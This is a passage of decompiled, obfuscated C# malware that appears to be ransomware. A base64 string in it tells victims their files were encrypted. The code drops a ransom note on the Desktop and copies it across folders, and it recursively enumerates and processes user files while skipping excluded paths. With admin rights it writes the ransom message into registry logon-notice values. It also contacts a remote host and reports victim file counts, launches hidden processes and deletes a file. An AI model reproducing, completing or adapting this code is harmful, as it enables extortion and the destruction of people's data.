				getString_0(107383535),
				getString_0(107383558),
				getString_0(107383553),
				getString_0(107383512),
				getString_0(107383507),
				getString_0(107383502),
				getString_0(107383497),
				getString_0(107383524),
				getString_0(107383519),
				getString_0(107383514),
				getString_0(107383477),
				getString_0(107383472),
				getString_0(107383467),
				getString_0(107383494),
				getString_0(107383489),
				getString_0(107383484),
				getString_0(107383447),
				getString_0(107383442),
				getString_0(107383433),
				getString_0(107383460),
				getString_0(107383455),
				getString_0(107383450),
				getString_0(107383413),
				getString_0(107383408),
				getString_0(107383403),
				getString_0(107383430),
				getString_0(107383421),
				getString_0(107383896),
				getString_0(107383887),
				getString_0(107383882),
				getString_0(107383909),
				getString_0(107383904),
				getString_0(107383863),
				getString_0(107383854),
				getString_0(107383849),
				getString_0(107383876),
				getString_0(107383867),
				getString_0(107383830),
				getString_0(107383825),
				getString_0(107383820),
				getString_0(107383847),
				getString_0(107383838),
				getString_0(107383833),
				getString_0(107383796),
				getString_0(107383787),
				getString_0(107383810),
				getString_0(107383805),
				getString_0(107383764),
				getString_0(107383759),
				getString_0(107383782),
				getString_0(107383773),
				getString_0(107383736),
				getString_0(107383731),
				getString_0(107383726),
				getString_0(107383721),
				getString_0(107383748),
				getString_0(107383743),
				getString_0(107383738),
				getString_0(107383701),
				getString_0(107383720),
				getString_0(107383715),
				getString_0(107383706),
				getString_0(107383669),
				getString_0(107383664),
				getString_0(107383687),
				getString_0(107383678),
				getString_0(107383673),
				getString_0(107383124),
				getString_0(107383119),
				getString_0(107383142),
				getString_0(107383137),
				getString_0(107383132),
				getString_0(107383091),
				getString_0(107383110),
				getString_0(107383105),
				getString_0(107383060),
				getString_0(107383055),
				getString_0(107383078),
				getString_0(107383073),
				getString_0(107383068),
				getString_0(107383031),
				getString_0(107383026),
				getString_0(107383017),
				getString_0(107383040),
				getString_0(107382999),
				getString_0(107382986),
				getString_0(107383013),
				getString_0(107383004),
				getString_0(107382967),
				getString_0(107382962),
				getString_0(107382957),
				getString_0(107382980),
				getString_0(107382975),
				getString_0(107382970),
				getString_0(107382929),
				getString_0(107382952),
				getString_0(107382947),
				getString_0(107382902),
				getString_0(107382893),
				getString_0(107382920),
				getString_0(107382915),
				getString_0(107382910),
				getString_0(107382905),
				getString_0(107383380),
				getString_0(107383375),
				getString_0(107383370),
				getString_0(107383397),
				getString_0(107383392),
				getString_0(107383387),
				getString_0(107383342),
				getString_0(107383337),
				getString_0(107383364),
				getString_0(107383359),
				getString_0(107383310),
				getString_0(107383305),
				getString_0(107383332),
				getString_0(107383323),
				getString_0(107383286),
				getString_0(107383281),
				getString_0(107383276),
				getString_0(107383303),
				getString_0(107383298),
				getString_0(107383293),
				getString_0(107383248),
				getString_0(107383271),
				getString_0(107383266),
				getString_0(107383261),
				getString_0(107383224),
				getString_0(107383219),
				getString_0(107383210),
				getString_0(107383233),
				getString_0(107383228),
				getString_0(107383191),
				getString_0(107383182),
				getString_0(107383177),
				getString_0(107383204),
				getString_0(107383199),
				getString_0(107383194),
				getString_0(107383157),
				getString_0(107383152),
				getString_0(107383147),
				getString_0(107383174),
				getString_0(107383165),
				getString_0(107382616),
				getString_0(107382611),
				getString_0(107382606),
				getString_0(107382629),
				getString_0(107382624),
				getString_0(107382583),
				getString_0(107382578),
				getString_0(107382573),
				getString_0(107382596),
				getString_0(107382591),
				getString_0(107382586),
				getString_0(107382549),
				getString_0(107382544),
				getString_0(107382567),
				getString_0(107382558),
				getString_0(107382553),
				getString_0(107382516),
				getString_0(107382511),
				getString_0(107382506),
				getString_0(107382533),
				getString_0(107382524),
				getString_0(107382483),
				getString_0(107382478),
				getString_0(107382473),
				getString_0(107382500),
				getString_0(107382495),
				getString_0(107382490),
				getString_0(107382453),
				getString_0(107382448),
				getString_0(107382443),
				getString_0(107382470),
				getString_0(107382465),
				getString_0(107382424),
				getString_0(107382419),
				getString_0(107382414),
				getString_0(107382409),
				getString_0(107382432),
				getString_0(107382427),
				getString_0(107382390),
				getString_0(107382385),
				getString_0(107382380),
				getString_0(107382407),
				getString_0(107382402),
				getString_0(107382397),
				getString_0(107382872),
				getString_0(107382867),
				getString_0(107382862),
				getString_0(107382857),
				getString_0(107382884),
				getString_0(107382879),
				getString_0(107382838),
				getString_0(107382833),
				getString_0(107382828),
				getString_0(107382855),
				getString_0(107382846),
				getString_0(107382805),
				getString_0(107382800),
				getString_0(107382823),
				getString_0(107382814),
				getString_0(107382809),
				getString_0(107382768),
				getString_0(107382787),
				getString_0(107382742),
				getString_0(107382729),
				getString_0(107382756),
				getString_0(107382751),
				getString_0(107382746),
				getString_0(107382709),
				getString_0(107382700),
				getString_0(107382727),
				getString_0(107382722),
				getString_0(107382717),
				getString_0(107382680),
				getString_0(107382675),
				getString_0(107382670),
				getString_0(107382693),
				getString_0(107382688),
				getString_0(107382683),
				getString_0(107382646),
				getString_0(107382641),
				getString_0(107382636),
				getString_0(107382663),
				getString_0(107382658),
				getString_0(107382653),
				getString_0(107382104),
				getString_0(107382099),
				getString_0(107382094),
				getString_0(107382089),
				getString_0(107382112),
				getString_0(107382071),
				getString_0(107382066),
				getString_0(107382061),
				getString_0(107382088),
				getString_0(107382079),
				getString_0(107382074),
				getString_0(107382037),
				getString_0(107382032),
				getString_0(107382027),
				getString_0(107382050),
				getString_0(107382045),
				getString_0(107382004),
				getString_0(107381999),
				getString_0(107381994),
				getString_0(107382021),
				getString_0(107382016),
				getString_0(107382011),
				getString_0(107381974),
				getString_0(107381969),
				getString_0(107381964),
				getString_0(107381987),
				getString_0(107381978),
				getString_0(107381941),
				getString_0(107381932),
				getString_0(107381959),
				getString_0(107381954),
				getString_0(107381949),
				getString_0(107381912),
				getString_0(107381907),
				getString_0(107381902),
				getString_0(107381897),
				getString_0(107381924),
				getString_0(107381915),
				getString_0(107381878),
				getString_0(107381873),
				getString_0(107381896),
				getString_0(107381891),
				getString_0(107381886),
				getString_0(107381881),
				getString_0(107382356),
				getString_0(107382351),
				getString_0(107382346),
				getString_0(107382373),
				getString_0(107382368),
				getString_0(107382363),
				getString_0(107382326),
				getString_0(107382321),
				getString_0(107382316),
				getString_0(107382343),
				getString_0(107382338),
				getString_0(107382333),
				getString_0(107382296),
				getString_0(107382311),
				getString_0(107382258),
				getString_0(107382253),
				getString_0(107382280),
				getString_0(107382275),
				getString_0(107382230),
				getString_0(107382217),
				getString_0(107382236),
				getString_0(107382199),
				getString_0(107382194),
				getString_0(107382189),
				getString_0(107382216),
				getString_0(107382207),
				getString_0(107382166),
				getString_0(107382161),
				getString_0(107382156),
				getString_0(107382183),
				getString_0(107382178),
				getString_0(107382173),
				getString_0(107382136),
				getString_0(107382127),
				getString_0(107382122),
				getString_0(107382149),
				getString_0(107381592),
				getString_0(107381587),
				getString_0(107381578),
				getString_0(107381597),
				getString_0(107381556),
				getString_0(107381571),
				getString_0(107381526),
				getString_0(107381521),
				getString_0(107381516),
				getString_0(107381543),
				getString_0(107381534),
				getString_0(107381529),
				getString_0(107381492),
				getString_0(107381487),
				getString_0(107381482),
				getString_0(107381505),
				getString_0(107381464),
				getString_0(107381459),
				getString_0(107381454),
				getString_0(107381449),
				getString_0(107381472),
				getString_0(107381467),
				getString_0(107381430),
				getString_0(107381425),
				getString_0(107381420),
				getString_0(107381447),
				getString_0(107381442),
				getString_0(107381437),
				getString_0(107381400),
				getString_0(107381395),
				getString_0(107381390),
				getString_0(107381385),
				getString_0(107381412),
				getString_0(107381407),
				getString_0(107381358),
				getString_0(107381353),
				getString_0(107381380),
				getString_0(107381375),
				getString_0(107381846),
				getString_0(107381837),
				getString_0(107381864),
				getString_0(107381855),
				getString_0(107381850),
				getString_0(107381805),
				getString_0(107381820),
				getString_0(107381783),
				getString_0(107381778),
				getString_0(107381773),
				getString_0(107381796),
				getString_0(107381791),
				getString_0(107381786),
				getString_0(107381741),
				getString_0(107381764),
				getString_0(107381759),
				getString_0(107381754),
				getString_0(107381717),
				getString_0(107381708),
				getString_0(107381735),
				getString_0(107381726),
				getString_0(107381685),
				getString_0(107381680),
				getString_0(107381675),
				getString_0(107381702),
				getString_0(107381693),
				getString_0(107381652),
				getString_0(107381647),
				getString_0(107381642),
				getString_0(107381669),
				getString_0(107381664),
				getString_0(107381659),
				getString_0(107381622),
				getString_0(107381617),
				getString_0(107381612),
				getString_0(107381635),
				getString_0(107381630),
				getString_0(107381625),
				getString_0(107381076),
				getString_0(107381071),
				getString_0(107381066),
				getString_0(107381093),
				getString_0(107381088),
				getString_0(107381083),
				getString_0(107381042),
				getString_0(107381037),
				getString_0(107381064),
				getString_0(107381059),
				getString_0(107381050),
				getString_0(107381013),
				getString_0(107381008),
				getString_0(107381027),
				getString_0(107381022),
				getString_0(107381017),
				getString_0(107380980),
				getString_0(107380975),
				getString_0(107380970),
				getString_0(107380997),
				getString_0(107380988),
				getString_0(107380951),
				getString_0(107380942),
				getString_0(107380937),
				getString_0(107380920),
				getString_0(107380915),
				getString_0(107380910),
				getString_0(107380905),
				getString_0(107380932),
				getString_0(107380927),
				getString_0(107380922),
				getString_0(107380885),
				getString_0(107380880),
				getString_0(107380875),
				getString_0(107380902),
				getString_0(107380893),
				getString_0(107380856),
				getString_0(107380851),
				getString_0(107380846),
				getString_0(107380841),
				getString_0(107380868),
				getString_0(107380863),
				getString_0(107380858),
				getString_0(107381333),
				getString_0(107381328),
				getString_0(107381323),
				getString_0(107381350),
				getString_0(107381345),
				getString_0(107381304),
				getString_0(107381295),
				getString_0(107381290),
				getString_0(107381317),
				getString_0(107381308),
				getString_0(107381271),
				getString_0(107381266),
				getString_0(107381257),
				getString_0(107381284),
				getString_0(107381279),
				getString_0(107381274),
				getString_0(107381237),
				getString_0(107381232),
				getString_0(107381227),
				getString_0(107381250),
				getString_0(107381245),
				getString_0(107381208),
				getString_0(107381203),
				getString_0(107381194),
				getString_0(107381221),
				getString_0(107381212),
				getString_0(107381171),
				getString_0(107381166),
				getString_0(107381161),
				getString_0(107381188),
				getString_0(107381179),
				getString_0(107381138),
				getString_0(107381133),
				getString_0(107381160),
				getString_0(107381155),
				getString_0(107381146),
				getString_0(107381109),
				getString_0(107381104),
				getString_0(107381127),
				getString_0(107381122),
				getString_0(107413333),
				getString_0(107413328),
				getString_0(107413323),
				getString_0(107413350),
				getString_0(107413345),
				getString_0(107413304),
				getString_0(107413299),
				getString_0(107413294),
				getString_0(107413317),
				getString_0(107413312),
				getString_0(107413307),
				getString_0(107413262),
				getString_0(107413257),
				getString_0(107413280),
				getString_0(107413275),
				getString_0(107413230),
				getString_0(107413225),
				getString_0(107413252),
				getString_0(107413247),
				getString_0(107413242),
				getString_0(107413205),
				getString_0(107413200),
				getString_0(107413195),
				getString_0(107413222),
				getString_0(107413217),
				getString_0(107413212),
				getString_0(107413175),
				getString_0(107413170),
				getString_0(107413161),
				getString_0(107413188),
				getString_0(107413179),
				getString_0(107413138),
				getString_0(107413133),
				getString_0(107413160),
				getString_0(107413151),
				getString_0(107413110),
				getString_0(107413105),
				getString_0(107413100),
				getString_0(107413123),
				getString_0(107413118),
				getString_0(107413113),
				getString_0(107413588),
				getString_0(107413583),
				getString_0(107413578),
				getString_0(107413605),
				getString_0(107413596),
				getString_0(107413559),
				getString_0(107413554),
				getString_0(107413549),
				getString_0(107413576),
				getString_0(107413571),
				getString_0(107413562),
				getString_0(107413525),
				getString_0(107413520),
				getString_0(107413515),
				getString_0(107413538),
				getString_0(107413529),
				getString_0(107413492),
				getString_0(107413487),
				getString_0(107413510),
				getString_0(107413501),
				getString_0(107413464),
				getString_0(107413455),
				getString_0(107413474),
				getString_0(107413469),
				getString_0(107413428),
				getString_0(107413423),
				getString_0(107413418),
				getString_0(107413445),
				getString_0(107413440),
				getString_0(107413435),
				getString_0(107413398),
				getString_0(107413393),
				getString_0(107413388),
				getString_0(107413415),
				getString_0(107413410),
				getString_0(107413405),
				getString_0(107413368),
				getString_0(107413363),
				getString_0(107413358),
				getString_0(107413381),
				getString_0(107413376),
				getString_0(107413371),
				getString_0(107412822),
				getString_0(107412813),
				getString_0(107412840),
				getString_0(107412831),
				getString_0(107412826),
				getString_0(107412789),
				getString_0(107412780),
				getString_0(107412803),
				getString_0(107412798),
				getString_0(107412793),
				getString_0(107412756),
				getString_0(107412751),
				getString_0(107412746),
				getString_0(107412769),
				getString_0(107412728),
				getString_0(107412715),
				getString_0(107412734),
				getString_0(107412729),
				getString_0(107412692),
				getString_0(107412683),
				getString_0(107412710),
				getString_0(107412701),
				getString_0(107412664),
				getString_0(107412659),
				getString_0(107412654),
				getString_0(107412677),
				getString_0(107412672),
				getString_0(107412631),
				getString_0(107412622),
				getString_0(107412645),
				getString_0(107412636),
				getString_0(107412599),
				getString_0(107412594),
				getString_0(107412589),
				getString_0(107412616),
				getString_0(107412607),
				getString_0(107412602),
				getString_0(107413077),
				getString_0(107413072),
				getString_0(107413067),
				getString_0(107413094),
				getString_0(107413089),
				getString_0(107413048),
				getString_0(107413043),
				getString_0(107413038),
				getString_0(107413033),
				getString_0(107413060),
				getString_0(107413055),
				getString_0(107413050),
				getString_0(107413013),
				getString_0(107413008),
				getString_0(107413003),
				getString_0(107413030),
				getString_0(107413025),
				getString_0(107413020),
				getString_0(107412979),
				getString_0(107412974),
				getString_0(107412969),
				getString_0(107412992),
				getString_0(107412987),
				getString_0(107412950),
				getString_0(107412945),
				getString_0(107412940),
				getString_0(107412967),
				getString_0(107412962),
				getString_0(107412953),
				getString_0(107412916),
				getString_0(107412911),
				getString_0(107412906),
				getString_0(107412933),
				getString_0(107412924),
				getString_0(107412887),
				getString_0(107412882),
				getString_0(107412877),
				getString_0(107412904),
				getString_0(107412899),
				getString_0(107412894),
				getString_0(107412889),
				getString_0(107412852),
				getString_0(107412843),
				getString_0(107412870),
				getString_0(107412865),
				getString_0(107412860),
				getString_0(107412307),
				getString_0(107412302),
				getString_0(107412297),
				getString_0(107412324),
				getString_0(107412319),
				getString_0(107412314),
				getString_0(107412273),
				getString_0(107412268),
				getString_0(107412295),
				getString_0(107412290),
				getString_0(107412281),
				getString_0(107412244),
				getString_0(107412239),
				getString_0(107412234),
				getString_0(107412261),
				getString_0(107412256),
				getString_0(107412251),
				getString_0(107412210),
				getString_0(107412205),
				getString_0(107412228),
				getString_0(107412219),
				getString_0(107412182),
				getString_0(107412177),
				getString_0(107412172),
				getString_0(107412199),
				getString_0(107412194),
				getString_0(107412189),
				getString_0(107412148),
				getString_0(107412143),
				getString_0(107412138),
				getString_0(107412165),
				getString_0(107412160),
				getString_0(107412119),
				getString_0(107412110),
				getString_0(107412105),
				getString_0(107412132),
				getString_0(107412127),
				getString_0(107412086),
				getString_0(107412081),
				getString_0(107412076),
				getString_0(107412099),
				getString_0(107412090),
				getString_0(107412557),
				getString_0(107412580),
				getString_0(107412571),
				getString_0(107412530),
				getString_0(107412521),
				getString_0(107412544),
				getString_0(107412539),
				getString_0(107412494),
				getString_0(107412517),
				getString_0(107412508),
				getString_0(107412471),
				getString_0(107412466),
				getString_0(107412457),
				getString_0(107412484),
				getString_0(107412475),
				getString_0(107412438),
				getString_0(107412429),
				getString_0(107412456),
				getString_0(107412451),
				getString_0(107412446),
				getString_0(107412401),
				getString_0(107412424),
				getString_0(107412419),
				getString_0(107412414),
				getString_0(107412409),
				getString_0(107412372),
				getString_0(107412363),
				getString_0(107412390),
				getString_0(107412381),
				getString_0(107412344),
				getString_0(107412339),
				getString_0(107412334),
				getString_0(107412357),
				getString_0(107412352),
				getString_0(107412347),
				getString_0(107411794),
				getString_0(107411789),
				getString_0(107411812),
				getString_0(107411803),
				getString_0(107411766),
				getString_0(107411761),
				getString_0(107411784),
				getString_0(107411775),
				getString_0(107411734),
				getString_0(107411729),
				getString_0(107411724),
				getString_0(107411751),
				getString_0(107411746),
				getString_0(107411737),
				getString_0(107411700),
				getString_0(107411695),
				getString_0(107411714),
				getString_0(107411669),
				getString_0(107411688),
				getString_0(107411675),
				getString_0(107411638),
				getString_0(107411633),
				getString_0(107411628),
				getString_0(107411655),
				getString_0(107411650),
				getString_0(107411645),
				getString_0(107411604),
				getString_0(107411599),
				getString_0(107411594),
				getString_0(107411617),
				getString_0(107411576),
				getString_0(107411571),
				getString_0(107411566),
				getString_0(107411561),
				getString_0(107411588),
				getString_0(107411583),
				getString_0(107411578),
				getString_0(107412053),
				getString_0(107412048),
				getString_0(107412071),
				getString_0(107412066),
				getString_0(107412061),
				getString_0(107412020),
				getString_0(107412039),
				getString_0(107412034),
				getString_0(107412029),
				getString_0(107411992),
				getString_0(107411987),
				getString_0(107411982),
				getString_0(107411977)
			}, new string[0], ayItgFuYWuh(secureString), getString_0(107412000));
		}
		catch (Exception ex9)
		{
			if (nCZIbbbLUfspycLk)
			{
				try
				{
					File.AppendAllText(VjgrxEUFvvHY, getString_0(107411927) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411934)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411934));
				streamWriter.WriteLine(AJakXHzLGH(getString_0(107411901)));
				streamWriter.WriteLine(getString_0(107396267));
				streamWriter.WriteLine(AJakXHzLGH(getString_0(107408787)));
				streamWriter.WriteLine(qJfhhMbMTrWQdCt);
				if (uzPKfOTMfp == getString_0(107396415))
				{
					streamWriter.WriteLine(getString_0(107396267));
					streamWriter.WriteLine(AJakXHzLGH(getString_0(107408754)) + Convert.ToString(meZsVdOPaL.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411934), getString_0(107408197) + qJfhhMbMTrWQdCt);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in XMwazMiiElRCF)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107411934)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411934), item + getString_0(107411934), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107411934), getString_0(107408197) + qJfhhMbMTrWQdCt);
				}
			}
			catch (Exception)
			{
			}
			if (!vqNqgcDHiRad && num > 10)
			{
				break;
			}
		}
		if (BhVyePUFOPIil == getString_0(107396958))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107408168)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107408168));
					streamWriter2.WriteLine(AJakXHzLGH(getString_0(107408135)));
					streamWriter2.WriteLine(getString_0(107396267));
					streamWriter2.WriteLine(AJakXHzLGH(getString_0(107400373)));
					streamWriter2.WriteLine(qJfhhMbMTrWQdCt + AJakXHzLGH(getString_0(107400316)));
					if (uzPKfOTMfp == getString_0(107396415))
					{
						streamWriter2.WriteLine(getString_0(107396267));
						streamWriter2.WriteLine(AJakXHzLGH(getString_0(107400783)) + AJakXHzLGH(getString_0(107408754)) + Convert.ToString(meZsVdOPaL.Count) + AJakXHzLGH(getString_0(107400316)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107408168), AJakXHzLGH(getString_0(107400783)) + getString_0(107408197) + qJfhhMbMTrWQdCt + AJakXHzLGH(getString_0(107400316)));
				}
			}
			catch
			{
			}
		}
		if (TczZkhBGoCcniWkV == getString_0(107396958))
		{
			try
			{
				if (uzPKfOTMfp == getString_0(107396415))
				{
					ApOKuNWkxqSR.vxdbMFfBOqF(getString_0(107400722), getString_0(107400689), getString_0(107400712), string.Concat(AJakXHzLGH(getString_0(107396333)), new WebClient().DownloadString(AJakXHzLGH(getString_0(107396308))), getString_0(107400663), AJakXHzLGH(getString_0(107396294)), DateTime.Now, getString_0(107396267), AJakXHzLGH(getString_0(107400658)), Convert.ToString(meZsVdOPaL.Count), getString_0(107396267), AJakXHzLGH(getString_0(107396253)), qJfhhMbMTrWQdCt));
				}
				else
				{
					ApOKuNWkxqSR.vxdbMFfBOqF(getString_0(107400722), getString_0(107400689), getString_0(107400712), string.Concat(AJakXHzLGH(getString_0(107396333)), new WebClient().DownloadString(AJakXHzLGH(getString_0(107396308))), getString_0(107400663), AJakXHzLGH(getString_0(107396294)), DateTime.Now, getString_0(107396267), AJakXHzLGH(getString_0(107400658)), Convert.ToString(meZsVdOPaL.Count), getString_0(107396267), AJakXHzLGH(getString_0(107396253)), qJfhhMbMTrWQdCt));
				}
			}
			catch
			{
			}
		}
		if (YDJWveSMrZd == getString_0(107396958))
		{
			try
			{
				iooMWrVwOXuA.bUzXMpTdzdQCHh(new Uri(getString_0(107400641)));
			}
			catch
			{
			}
		}
		if (BhVyePUFOPIil == getString_0(107396415))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411934)))
				{
					Process.Start(AJakXHzLGH(getString_0(107400640)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411934));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107408168)))
				{
					Process.Start(AJakXHzLGH(getString_0(107400615)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107408168));
				}
			}
			catch
			{
			}
		}
		if (ziyLGCeCiW == getString_0(107396958))
		{
			if (ewVjhJjhIvwYgDZ == getString_0(107396958) && !string.IsNullOrEmpty(MwbPGaKLbgh) && !string.IsNullOrEmpty(DDSKICgrrvLazV))
			{
				PTEUBFhKsAzKSYC(MwbPGaKLbgh, DDSKICgrrvLazV);
			}
			else
			{
				PTEUBFhKsAzKSYC(getString_0(107400566), getString_0(107400569));
			}
		}
		if (QdZxIHZGumV != getString_0(107399791))
		{
			rbXGQjfAtoDn(QdZxIHZGumV);
		}
		if (!string.IsNullOrEmpty(osmTRGTGUlEcU))
		{
			try
			{
				File.Delete(osmTRGTGUlEcU);
			}
			catch
			{
			}
		}
		if (nCZIbbbLUfspycLk)
		{
			try
			{
				File.AppendAllText(VjgrxEUFvvHY, getString_0(107399806));
			}
			catch (Exception)
			{
			}
		}
		if (btrCVBaeRi == getString_0(107400273))
		{
			NfybKqnWcJrqY();
		}
	}

	public static void vNFmSYKzBhrBFTX()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(AJakXHzLGH(getString_0(107400296)), AJakXHzLGH(getString_0(107400110)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int veCqjBlpkTdCHcNU(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> QRkWvCgAxAtr(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107400125)) && !text.Contains(getString_0(107400100)) && !text.Contains(getString_0(107400067)) && !text.ToLower().Contains(getString_0(107399506)) && !text.ToLower().Contains(getString_0(107399525)) && !text.Contains(getString_0(107399468)) && !text.Contains(getString_0(107399447)) && !text.ToLower().Contains(getString_0(107399462)) && !text.ToLower().Contains(getString_0(107399449)) && !text.ToLower().Contains(getString_0(107399380)) && !text.ToLower().Contains(getString_0(107399371)) && !text.ToLower().Contains(getString_0(107399386)) && !text.ToLower().Contains(getString_0(107399341)) && !text.ToLower().Contains(getString_0(107399360)) && !text.ToLower().Contains(getString_0(107399307)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107399282)) && !fileInfo.FullName.Contains(getString_0(107399297)) && !fileInfo.FullName.Contains(getString_0(107399760)) && !fileInfo.FullName.Contains(getString_0(107399775)) && !fileInfo.FullName.Contains(getString_0(107399726)) && !fileInfo.FullName.Contains(getString_0(107399741)) && !fileInfo.FullName.Contains(getString_0(107399692)) && !fileInfo.FullName.Contains(getString_0(107399707)) && !fileInfo.FullName.Contains(getString_0(107399662)) && !fileInfo.FullName.Contains(getString_0(107399673)) && !fileInfo.FullName.ToLower().Contains(getString_0(107399628)) && !fileInfo.FullName.ToLower().Contains(getString_0(107399647)) && !fileInfo.FullName.ToLower().Contains(getString_0(107399598)) && !fileInfo.FullName.ToLower().Contains(getString_0(107399613)) && !fileInfo.FullName.Contains(AJakXHzLGH(getString_0(107399564))) && !fileInfo.FullName.Contains(getString_0(107399539)) && !fileInfo.FullName.Contains(getString_0(107399558)) && !fileInfo.FullName.EndsWith(getString_0(107412000)) && !fileInfo.FullName.EndsWith(getString_0(107398989)) && !fileInfo.FullName.EndsWith(getString_0(107399016)) && !fileInfo.FullName.EndsWith(getString_0(107399011)) && !fileInfo.FullName.EndsWith(getString_0(107399006)) && !fileInfo.FullName.Contains(getString_0(107399001)) && !fileInfo.FullName.Contains(UCnmTIRKyzLvN) && !fileInfo.FullName.Contains(VjgrxEUFvvHY) && !fileInfo.FullName.Contains(jUdQCPAqaGpC))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(PWOhwOPFeWY) * 1024.0 * 1024.0 && plZapolsnYB == getString_0(107396958))
						{
							list.Add(fileInfo.FullName);
							yJfHDyDKAPg(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && plZapolsnYB == getString_0(107396415))
						{
							list.Add(fileInfo.FullName);
							yJfHDyDKAPg(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string dfqtCTBwlwyp(string LScBPwBJTopHkA = "", string JOBBUAPTKQdD = "")
	{
		string result = getString_0(107400641);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = LScBPwBJTopHkA,
				Arguments = JOBBUAPTKQdD,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void ZvWBkfnfyzGs(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107398984),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string izMuybnTAClZSoX(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string AJakXHzLGH(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void pptnNaEekS(string UbiObXQkwXq = "", string SprwPnXtwULa = "SW5mb3JtYXRpb24uLi4=", string AhKfoDyJWQ = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		UbiObXQkwXq = izMuybnTAClZSoX(getString_0(107398935));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(AJakXHzLGH(UbiObXQkwXq), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(AJakXHzLGH(getString_0(107398838)), AJakXHzLGH(SprwPnXtwULa));
				registryKey.SetValue(AJakXHzLGH(getString_0(107398805)), AJakXHzLGH(AhKfoDyJWQ));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			UbiObXQkwXq = izMuybnTAClZSoX(getString_0(107398776));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(AJakXHzLGH(UbiObXQkwXq), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(AJakXHzLGH(getString_0(107399183)), AJakXHzLGH(SprwPnXtwULa));
				registryKey.SetValue(AJakXHzLGH(getString_0(107399150)), AJakXHzLGH(AhKfoDyJWQ));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void bBLzBVIPeRuqMay()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (ewVjhJjhIvwYgDZ == getString_0(107396958) && !string.IsNullOrEmpty(MwbPGaKLbgh) && !string.IsNullOrEmpty(DDSKICgrrvLazV))
				{
					pptnNaEekS(getString_0(107400641), MwbPGaKLbgh, DDSKICgrrvLazV);
				}
				else
				{
					pptnNaEekS(getString_0(107400641), getString_0(107400566), getString_0(107400569));
				}
			}
		}
		catch
		{
		}
	}

